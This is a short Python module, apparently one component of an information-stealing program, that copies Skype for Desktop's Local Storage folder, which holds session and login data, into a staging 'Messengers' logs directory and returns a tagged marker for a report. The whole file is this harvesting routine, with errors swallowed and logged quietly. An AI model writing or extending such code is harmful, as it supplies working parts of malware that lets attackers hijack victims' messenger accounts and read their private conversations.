from shutil import copytree
from os import makedirs,sep,environ
from manager.logger import Log
from preferences.config import config

def Skype():
    data = ""
    local = environ['USERPROFILE'] + sep + r'AppData\Local'
    user = environ['USERPROFILE']
    pathToLogs = f'{user}\\{config.pathToLogs}\\Messengers\\Skype'
    path1 = r"\Microsoft\Skype for Desktop\Local Storage"
    try:
        makedirs(pathToLogs)
        copytree(rf"{local}{path1}",pathToLogs)
        data += "\n∟📨Skype"
        return data
    except Exception as e:
        Log(f"Skype ---> {e}")
        return data

